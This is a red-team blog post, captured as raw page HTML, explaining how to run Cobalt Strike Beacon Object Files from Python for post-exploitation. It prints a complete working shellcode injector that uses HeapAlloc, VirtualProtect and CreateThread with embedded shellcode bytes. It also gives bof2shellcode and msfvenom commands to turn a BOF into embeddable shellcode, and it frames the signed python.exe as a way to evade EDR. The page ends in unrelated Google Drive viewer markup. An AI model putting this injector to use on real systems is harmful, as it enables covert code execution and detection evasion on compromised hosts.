# https://naksyn.com/injection/2022/02/16/running-cobalt-strike-bofs-from-python.html

<!DOCTYPE html><!--
    So Simple Jekyll Theme 3.2.0
    Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
    Free for personal and commercial use under the MIT license
    https://github.com/mmistakes/so-simple-theme/blob/master/LICENSE
--><html lang="en-US" class="js fontawesome-i2svg-active fontawesome-i2svg-complete" dir="ltr">



  

    

  


  <body class="layout--post  running-cobalt-strike-bofs-from-python" role="application" itemscope="" itemtype="http://schema.org/CreativeWork/FileObject" jsaction="u0pjoe:.CLIENT;UjQMac:.CLIENT">
    

    
  <div class="navigation-wrapper">
    <a href="https://naksyn.com/injection/2022/02/16/running-cobalt-strike-bofs-from-python.html#menu-toggle" id="menu-toggle">Menu</a>
    
  </div><!-- /.navigation-wrapper -->


    <!-- /.masthead -->


    <main id="main" class="main-content" aria-label="Content">
  <article class="h-entry">
    

    <div class="page-wrapper">
      

      <div class="page-sidebar">
        <div class="page-author h-card p-author"><img src="https://naksyn.com/images/milky_way_150x150.jpg" class="author-avatar u-photo" alt="Naksyn"><div class="author-info"><div class="author-name">
        <span class="p-name">Naksyn</span>
      </div><ul class="author-links"><li class="author-link">
            <a class="u-url" rel="me" href="https://twitter.com/naksyn"><svg class="svg-inline--fa fa-twitter-square fa-w-14 fa-lg" title="Twitter" aria-labelledby="svg-inline--fa-title-1" data-prefix="fab" data-icon="twitter-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><title id="svg-inline--fa-title-1">Twitter</title><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"></path></svg><!-- <i class="fab fa-twitter-square fa-lg" title="Twitter"></i> --></a>
          </li><li class="author-link">
            <a class="u-url" rel="me" href="https://github.com/naksyn"><svg class="svg-inline--fa fa-github-square fa-w-14 fa-lg" title="GitHub" aria-labelledby="svg-inline--fa-title-2" data-prefix="fab" data-icon="github-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><title id="svg-inline--fa-title-2">GitHub</title><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM277.3 415.7c-8.4 1.5-11.5-3.7-11.5-8 0-5.4.2-33 .2-55.3 0-15.6-5.2-25.5-11.3-30.7 37-4.1 76-9.2 76-73.1 0-18.2-6.5-27.3-17.1-39 1.7-4.3 7.4-22-1.7-45-13.9-4.3-45.7 17.9-45.7 17.9-13.2-3.7-27.5-5.6-41.6-5.6-14.1 0-28.4 1.9-41.6 5.6 0 0-31.8-22.2-45.7-17.9-9.1 22.9-3.5 40.6-1.7 45-10.6 11.7-15.6 20.8-15.6 39 0 63.6 37.3 69 74.3 73.1-4.8 4.3-9.1 11.7-10.6 22.3-9.5 4.3-33.8 11.7-48.3-13.9-9.1-15.8-25.5-17.1-25.5-17.1-16.2-.2-1.1 10.2-1.1 10.2 10.8 5 18.4 24.2 18.4 24.2 9.7 29.7 56.1 19.7 56.1 19.7 0 13.9.2 36.5.2 40.6 0 4.3-3 9.5-11.5 8-66-22.1-112.2-84.9-112.2-158.3 0-91.8 70.2-161.5 162-161.5S388 165.6 388 257.4c.1 73.4-44.7 136.3-110.7 158.3zm-98.1-61.1c-1.9.4-3.7-.4-3.9-1.7-.2-1.5 1.1-2.8 3-3.2 1.9-.2 3.7.6 3.9 1.9.3 1.3-1 2.6-3 3zm-9.5-.9c0 1.3-1.5 2.4-3.5 2.4-2.2.2-3.7-.9-3.7-2.4 0-1.3 1.5-2.4 3.5-2.4 1.9-.2 3.7.9 3.7 2.4zm-13.7-1.1c-.4 1.3-2.4 1.9-4.1 1.3-1.9-.4-3.2-1.9-2.8-3.2.4-1.3 2.4-1.9 4.1-1.5 2 .6 3.3 2.1 2.8 3.4zm-12.3-5.4c-.9 1.1-2.8.9-4.3-.6-1.5-1.3-1.9-3.2-.9-4.1.9-1.1 2.8-.9 4.3.6 1.3 1.3 1.8 3.3.9 4.1zm-9.1-9.1c-.9.6-2.6 0-3.7-1.5s-1.1-3.2 0-3.9c1.1-.9 2.8-.2 3.7 1.3 1.1 1.5 1.1 3.3 0 4.1zm-6.5-9.7c-.9.9-2.4.4-3.5-.6-1.1-1.3-1.3-2.8-.4-3.5.9-.9 2.4-.4 3.5.6 1.1 1.3 1.3 2.8.4 3.5zm-6.7-7.4c-.4.9-1.7 1.1-2.8.4-1.3-.6-1.9-1.7-1.5-2.6.4-.6 1.5-.9 2.8-.4 1.3.7 1.9 1.8 1.5 2.6z"></path></svg><!-- <i class="fab fa-github-square fa-lg" title="GitHub"></i> --></a>
          </li></ul>

<span class="read-time">5 min read</span>

    <time class="page-date dt-published" datetime="2022-02-16T00:00:00-05:00"><a class="u-url" href="https://naksyn.com/injection/2022/02/16/running-cobalt-strike-bofs-from-python.html">February 16, 2022</a>
</time>

  </div>
</div>

        
  <h3 class="page-taxonomies-title">Categories</h3>
  
  <ul class="page-taxonomies"><li class="page-taxonomy"><a class="p-category" href="https://naksyn.com/categories/#injection" title="Pages filed under injection">injection</a></li>
  </ul>


        
  <h3 class="page-taxonomies-title">Tags</h3>
  
  <ul class="page-taxonomies"><li class="page-taxonomy"><a href="https://naksyn.com/tags/#bof" title="Pages tagged BOF" rel="tag">BOF</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#cobalt-strike" title="Pages tagged cobalt strike" rel="tag">cobalt strike</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#coff" title="Pages tagged coff" rel="tag">coff</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#injection" title="Pages tagged injection" rel="tag">injection</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#python" title="Pages tagged python" rel="tag">python</a></li><li class="page-taxonomy"><a href="https://naksyn.com/tags/#shellcode" title="Pages tagged shellcode" rel="tag">shellcode</a></li>
  </ul>


      </div>

      <div class="page-content">
        <div class="e-content">
          <p><img src="https://naksyn.com/images/coff.png" alt="image-center" title="Coughing BOFs from python!" class="align-center"></p>

<h3 id="tldr">TL;DR</h3>
<p>Python might be used to run Cobalt Strike’s BOFs by using previous work from <a href="https://github.com/trustedsec/COFFLoader">Trustedsec</a> and <a href="https://medium.com/falconforce/bof2shellcode-a-tutorial-converting-a-stand-alone-bof-loader-into-shellcode-6369aa518548">FalconForce</a>, one can pick a BOF and use <a href="https://github.com/FalconForceTeam/BOF2shellcode">BOF2Shellcode</a> to embed the shellcode in a python injector. This brings some post-ex capabilities that could be added to existing frameworks or deployed from a gained foothold making use of a signed binary (python.exe) as a host process for running BOFs using local shellcode injection - PoC on <a href="https://github.com/naksyn/python-bof-runner">my github</a>.</p>

<h3 id="intro">Intro</h3>
<p>Python got great popularity as a C2 language in recent years and the offsec community brought many great projects like <a href="https://github.com/trustedsec/trevorc2">TrevorC2</a>, <a href="https://github.com/facebookarchive/WEASEL">WEASEL</a>, <a href="https://github.com/n1nj4sec/pupy">pupy</a>, etc. However, its popularity as a Windows-agent-language never really took off, mainly because of some significant limitations such as:</p>
<ol>
  <li>Final .exe size made huge because of Python interpreter dependencies to be included;</li>
  <li>Ease of getting source code from Python artifacts;</li>
  <li>Complexity of creating shellcode that executes python code.</li>
</ol>

<p>This drawbacks stem from the fact that Python is an interpreted language, so you basically have to bring the python interpreter and its dependencies with you, wether you’re creating a stage(r) shellcode or an .exe to deliver.
However, I would encompass these 3 big limitations under the “Getting Access” phase of an engagement since python will be basically ruled out if you’re trying to phish or exploit some vulnerability that requires stable and tiny shellcode.</p>

<p>But still, to me Python has so much yet to give during the “Post Exploitation” phase, because, well…<strong>“in the EDR era signed binaries are kings”</strong>, and it’s worth reminding that the official Python binary is signed indeed.
It’s also worth mentioning that in enterprise environments devs do crazy stuff so Python is pretty common almost everywhere.
Using python would be a viable way to blend-in on some machines, if we only had modern capabilities to leverage.</p>

<p>This thought has been placed in the backseats of my mind for quite some time, until I saw some recent brilliant projects
that opened up some new avenues.</p>

<h3 id="poc--gtfo">PoC || GTFO</h3>

<p>Earlier in 2021 Kevin Haubris from Trustedsec published a cool project called <a href="https://github.com/trustedsec/COFFLoader">COFFloader</a>, that basically lets you load and run Cobal Strikes Beacon Object Files (BOFs) outside of Cobalt Strike itself.
Some weeks ago Gijs Hollestelle from Falconforce published <a href="https://github.com/FalconForceTeam/BOF2shellcode">BOF2Shellcode</a> which essentially converts BOFs to raw shellcode and combines it with COFFLoader (converted too) in a way so that BOFs can be loaded by the same resulting shellcode.</p>

<p>Reading the FalconForce <a href="https://medium.com/falconforce/bof2shellcode-a-tutorial-converting-a-stand-alone-bof-loader-into-shellcode-6369aa518548">post</a> (I highly encourage to do it also since Gijs described the whole process to get things working) I understood that one could simply run BOFs also with python by using the shellcode generated by BOF2Shellcode and the help of an injector.
Let’s try this out. As an injector I opted for the local shellcode technique using <code class="language-plaintext highlighter-rouge">HeapAlloc</code> technique, to which I added a <code class="language-plaintext highlighter-rouge">VirtualProtect</code> to set execute-only permissions since this might be useful for evasion and shenanigans.
Bear in mind that by using execute-only permissions you’re out in the cold if using self decoding shellcodes or more complex ones.
This only works if the shellcode itself does not need WR permissions, and this might be the case with some BOFs.
Here’s the python injector I used:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
</pre></td><td class="code"><pre><span class="s">"""
	Author: @naksyn

	BOF runner using Local shellcode injection with HeapAlloc()
        /CreateThread() and setting execute-only permissions with
	VirtualAlloc().
	Warning - stagers and shellcodes with self-decoding stubs
 	might not work, change permissions accordingly or remove
	VirtualProtect call by keeping RWX.

"""</span>

<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">ctypes.wintypes</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Windows/x64 - Dynamic Null-Free WinExec PopCalc Shellcode (205 Bytes)- Author Bobby Cooke @0xBoku - https://www.exploit-db.com/exploits/49819
</span><span class="n">calc</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b</span><span class="s">"</span>
<span class="n">calc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2</span><span class="s">"</span>
<span class="n">calc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b</span><span class="s">"</span>
<span class="n">calc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04</span><span class="s">"</span>
<span class="n">calc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0</span><span class="s">"</span>
<span class="n">calc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2</span><span class="s">"</span>
<span class="n">calc</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x48\x83\xec\x20\x41\xff\xd6</span><span class="s">"</span>

<span class="n">shellcode</span><span class="o">=</span><span class="n">calc</span>
<span class="n">kernel32</span> <span class="o">=</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">windll</span><span class="p">.</span><span class="n">kernel32</span>
<span class="n">isx64</span> <span class="o">=</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">c_void_p</span><span class="p">)</span> <span class="o">==</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">c_ulonglong</span><span class="p">)</span>

<span class="n">_kernel32</span> <span class="o">=</span> <span class="n">WinDLL</span><span class="p">(</span><span class="s">'kernel32'</span><span class="p">)</span>
<span class="n">HEAP_ZERO_MEMORY</span> <span class="o">=</span> <span class="mh">0x00000008</span>
<span class="n">HEAP_CREATE_ENABLE_EXECUTE</span> <span class="o">=</span> <span class="mh">0x00040000</span>
<span class="n">PAGE_READ_EXECUTE</span> <span class="o">=</span> <span class="mh">0x20</span>
<span class="n">PAGE_EXECUTE</span><span class="o">=</span> <span class="mh">0x10</span>
<span class="n">ULONG_PTR</span> <span class="o">=</span> <span class="n">c_ulonglong</span> <span class="k">if</span> <span class="n">isx64</span> <span class="k">else</span> <span class="n">DWORD</span>
<span class="n">SIZE_T</span> <span class="o">=</span> <span class="n">ULONG_PTR</span>

<span class="c1"># Functions Prototypes
</span><span class="n">VirtualProtect</span> <span class="o">=</span> <span class="n">_kernel32</span><span class="p">.</span><span class="n">VirtualProtect</span>
<span class="n">VirtualProtect</span><span class="p">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">BOOL</span>
<span class="n">VirtualProtect</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span> <span class="n">LPVOID</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">PDWORD</span> <span class="p">]</span>

<span class="c1"># HeapAlloc()
</span><span class="n">HeapAlloc</span> <span class="o">=</span> <span class="n">_kernel32</span><span class="p">.</span><span class="n">HeapAlloc</span>
<span class="n">HeapAlloc</span><span class="p">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">LPVOID</span>
<span class="n">HeapAlloc</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span> <span class="n">HANDLE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="p">]</span>

<span class="c1"># HeapCreate()
</span><span class="n">HeapCreate</span> <span class="o">=</span> <span class="n">_kernel32</span><span class="p">.</span><span class="n">HeapCreate</span>
<span class="n">HeapCreate</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span><span class="n">DWORD</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">]</span>
<span class="n">HeapCreate</span><span class="p">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">HANDLE</span>

<span class="c1"># RtlMoveMemory()
</span><span class="n">RtlMoveMemory</span> <span class="o">=</span> <span class="n">_kernel32</span><span class="p">.</span><span class="n">RtlMoveMemory</span>
<span class="n">RtlMoveMemory</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span><span class="n">LPVOID</span><span class="p">,</span> <span class="n">LPVOID</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="p">]</span>
<span class="n">RtlMoveMemory</span><span class="p">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">LPVOID</span>

<span class="c1"># CreateThread()
</span><span class="n">CreateThread</span> <span class="o">=</span> <span class="n">_kernel32</span><span class="p">.</span><span class="n">CreateThread</span>
<span class="n">CreateThread</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span> <span class="n">LPVOID</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">,</span> <span class="n">LPVOID</span><span class="p">,</span> <span class="n">LPVOID</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="p">]</span>
<span class="n">CreateThread</span><span class="p">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">HANDLE</span>

<span class="c1"># WaitForSingleObject()
</span><span class="n">WaitForSingleObject</span> <span class="o">=</span> <span class="n">_kernel32</span><span class="p">.</span><span class="n">WaitForSingleObject</span>
<span class="n">WaitForSingleObject</span><span class="p">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">[</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">]</span>
<span class="n">WaitForSingleObject</span><span class="p">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">DWORD</span>


<span class="n">heapHandle</span> <span class="o">=</span> <span class="n">HeapCreate</span><span class="p">(</span><span class="n">HEAP_CREATE_ENABLE_EXECUTE</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">HeapAlloc</span><span class="p">(</span><span class="n">heapHandle</span><span class="p">,</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[+] Heap allocated at: {:08X}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">heapHandle</span><span class="p">))</span>
<span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">heapHandle</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[+] Shellcode copied into memory.'</span><span class="p">)</span>

<span class="n">VirtualProtect</span><span class="p">(</span><span class="n">heapHandle</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">PAGE_EXECUTE</span> <span class="p">,</span> <span class="n">ctypes</span><span class="p">.</span><span class="n">c_ulong</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[+] Set RX permissions on memory'</span><span class="p">)</span>
<span class="n">threadHandle</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">heapHandle</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[+] Executed Thread in current process.'</span><span class="p">)</span>
<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">threadHandle</span><span class="p">,</span> <span class="mh">0xFFFFFFFF</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></figure>

<p>At this point one would just need to grab the shellcode from Bof2Shellcode using a BOF of our choice, so I opted for Trustedsec’s <a href="https://github.com/trustedsec/CS-Situational-Awareness-BOF/blob/master/SA/tasklist/tasklist.x64.o">Tasklist</a> and used bof2shellcode to generate the resulting shellcode, including the COFFLoader:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>python3 bof2shellcode.py <span class="nt">-i</span> /home/naksyn/bofs/tasklist.x64.o <span class="nt">-o</span> tasklist.x64.bin
</pre></td></tr></tbody></table></code></pre></figure>

<p>I then used msfvenom to make tasklist.x64.bin trivially embeddable in a python script:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>msfvenom <span class="nt">-p</span> generic/custom <span class="nv">PAYLOADFILE</span><span class="o">=</span>tasklist.x64.bin <span class="nt">-f</span> python <span class="o">&gt;</span> sc_tasklist.txt
</pre></td></tr></tbody></table></code></pre></figure>

<p>So after pasting the shellcode into the python injector script let’s see the tasklist BOF coughed out by Python:</p>

<div class="gdrive-wrapper">
  <div src="https://drive.google.com/file/d/1TNE4Esjg8IwWmaCa28wWm9C7IDuU4Hm0/preview" allowfullscreen="" data-original-tag="iframe"><title>bof-runner.gif - Google Drive</title><link rel="shortcut icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png"><link rel="stylesheet" href="https://www.gstatic.com/_/apps-fileview/_/ss/k=apps-fileview.v.kRsYSVpxcys.L.W.O/am=ACAY/d=0/rs=AO0039urDIAZbiaYK5dLRJ3FfVUobqryDw" data-id="_cl" nonce=""><link href="https://fonts.googleapis.com/css2?family=Google+Material+Icons:wght@400;500;700" rel="stylesheet" nonce=""><div tabindex="-1" style="position: absolute; width: 9em; height: 9em; top: -99em;" aria-hidden="true" data-original-tag="iframe"></div><div style="display:none" aria-hidden="true"><div id="one-google-bar" class="ndfHFb-c4YZDc-Woal0c-jcJzye-ZMv3u ndfHFb-c4YZDc-n1UuX-Bz112c"></div></div><link href="https://www.gstatic.com/og/_/ss/k=og.asy.WOB2oMlf65g.L.W.O/m=adcgm3/excm=/d=1/ed=1/ct=zgms/rs=AA2YrTtB0-gf_6HonYIHXzevM1kW_7sFIQ" nonce="" media="all" rel="stylesheet" aria-hidden="true"><div id="sharing-aria-speakable" class="EDlbXc-RTRLOc-OUyo8b" aria-live="assertive" role="region" aria-atomic="true"></div><div sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fdrive.google.com%2Fdrivesharing%2Fclientmodel%3Fid%3D1TNE4Esjg8IwWmaCa28wWm9C7IDuU4Hm0%26foreignService%3Dtexmex%26authuser%3D0%26origin%3Dhttps%3A%2F%2Fdrive.google.com&amp;dsh=S-1875626048%3A1771412763983711&amp;followup=https%3A%2F%2Fdrive.google.com%2Fdrivesharing%2Fclientmodel%3Fid%3D1TNE4Esjg8IwWmaCa28wWm9C7IDuU4Hm0%26foreignService%3Dtexmex%26authuser%3D0%26origin%3Dhttps%3A%2F%2Fdrive.google.com&amp;ifkv=ASfE1-paRWMv3oXD72yU8Iywq5oRaTc6Yh_kRzbYNTtydotGI33KqiuRh4LmYyGfpJqNgmGWtUH6&amp;osid=1&amp;passive=1209600&amp;flowName=GlifWebSignIn&amp;flowEntry=ServiceLogin" style="visibility: hidden; height: 10px; width: 10px; position: absolute; left: -10px; top: -10px;" aria-hidden="true" data-original-tag="iframe"><title>Error 403 (Forbidden)!!1</title><main id="af-error-container" role="main"><a href="https://www.google.com/"><span id="logo" aria-label="Google" role="img"></span></a><p><b>403.</b> <ins>That’s an error.</ins></p><p>We're sorry, but you do not have access to this page. <ins>That’s all we know.</ins></p></main></div><div class="YM5U3 dif24c vhoiae LgGVmb bvmRsc YLZndc" jscontroller="GpztQ" jsaction="rcuQ6b:npT2md;M3WHIb:eAbjWe;qhShn:Vtdxob;u3ErQ:ybzaBc;NsPRle:vGvlO;eaIRqb:KJfGrc;mlVrrf:LN5Ncf;grqj7c:AciWkb;a6J6Fe:.CLIENT;kVosSb:.CLIENT;NR7V0e:.CLIENT;l7JJqb:.CLIENT" jsmodel="t1DRgd;A39h6e"><span jsaction="focus:AN1NLe(r08add),RZmiOe(E6eRQd)" jsshadow="" class="tORug" jscontroller="ZzYu3e"><div aria-hidden="true" tabindex="0" jsname="r08add" role="button"></div><span jsname="bN97Pc" jsslot="" class=""><div jsname="JOC2Se"><div class="ndfHFb-c4YZDc ndfHFb-c4YZDc-AHmuwe-Hr88gd-OWB6Me dif24c vhoiae LgGVmb bvmRsc ndfHFb-c4YZDc-vyDMJf-aZ2wEe ndfHFb-c4YZDc-i5oIFb ndfHFb-c4YZDc-uoC0bf ndfHFb-c4YZDc-e1YmVc ndfHFb-c4YZDc-TSZdd" aria-label="Showing viewer."><div class="ndfHFb-c4YZDc-zTETae" aria-label="Loading bof-runner.gif."></div><div class="ndfHFb-c4YZDc-JNEHMb"><div class="ndfHFb-c4YZDc-uWtm3-ORHb" role="status" tabindex="0"><div class="ndfHFb-c4YZDc-uWtm3-ORHb-Bz112c"></div><div class="ndfHFb-c4YZDc-uWtm3-ORHb-bN97Pc"><div class="ndfHFb-c4YZDc-uWtm3-ORHb-Ne3sFf"></div><div class="ndfHFb-c4YZDc-uWtm3-ORHb-LQLjdd"><div class="ndfHFb-c4YZDc-uWtm3-ORHb-GrFcDd-ShBeI-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe ndfHFb-c4YZDc-uWtm3-ORHb-GrFcDd-ShBeI-LgbsSe" title="" role="button" tabindex="0" style="user-select: none;">Request a review</div></div><div class="ndfHFb-c4YZDc-uWtm3-ORHb-KY1xSc-z5C9Gb-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe ndfHFb-c4YZDc-uWtm3-ORHb-KY1xSc-z5C9Gb-LgbsSe" title="" role="button" tabindex="0" style="user-select: none;">Learn more</div></div><div class="ndfHFb-c4YZDc-uWtm3-ORHb-IYtByb-LgbsSe-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe" title="" role="button" aria-label="Dismiss warning" tabindex="0" style="user-select: none;"><div class="ndfHFb-c4YZDc-Bz112c  ndfHFb-c4YZDc-uWtm3-ORHb-IYtByb-Bz112c" aria-label="Close banner"></div></div></div></div></div></div><div class="ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-haAclf"><div class="ndfHFb-c4YZDc-dZssN-ORHb-Bz112c"><svg xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 -960 960 960" width="24" fill="#041E49"><path d="M80-360v-57l340-340q43-43 100.5-63T646-840q71 0 130.5 23T880-750L730-600h-90v78q-39 24-83 37t-91 13q-44 0-88-12.5T296-520L136-360H80Zm386-192q24 0 47.5-4.5T560-570v-110h137l58-58q-23-11-50-16.5t-59-5.5q-51 0-97 17.5T470-692L356-578q24 12 52.5 19t57.5 7Zm14 232v-40q0-17 11.5-28.5T520-400h200q17 0 28.5 11.5T760-360v40H480Zm-40 200q-17 0-28.5-11.5T400-160v-80q0-17 11.5-28.5T440-280h360q17 0 28.5 11.5T840-240v80q0 17-11.5 28.5T800-120H440Zm116-536Z"></path></svg></div><div class="ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-bN97Pc"><div class="ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-jOfkMb" tabindex="0" role="heading" aria-level="1">Signature pending</div><div class="ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-Vkfede-Ne3sFf"></div><div class="ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-LQLjdd"><div class="ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-mKZypf-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-mKZypf-LgbsSe" title="" role="link" tabindex="0" style="user-select: none;">Sign</div></div><div class="ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-ERydpb-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-ERydpb-LgbsSe" title="" role="button" tabindex="0" style="user-select: none;">Reject</div></div><div class="ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-nUpftc-MZArnb-sM5MNb"><div class="VIpgJd-TzA9Ye-eEGnhe VIpgJd-C41vtd-LgbsSe ndfHFb-c4YZDc-dZssN-FVVVue-ORHb-nUpftc-MZArnb-LgbsSe" title="" role="button" tabindex="0" style="user-select: none;">View details</div></div></div></div></div><div class="ndfHFb-c4YZDc-SjW3R-ORHb-haAclf" tabindex="0" role="complementary"><div class="ndfHFb-c4YZDc-SjW3R-ORHb"><div class="ndfHFb-c4YZDc-SjW3R-ORHb-Bz112c"></div><div class="ndfHFb-c4YZDc-SjW3R-ORHb-Ne3sFf"></div><div class="ndfHFb-c4YZDc-SjW3R-ORHb-c6xFrd"><div 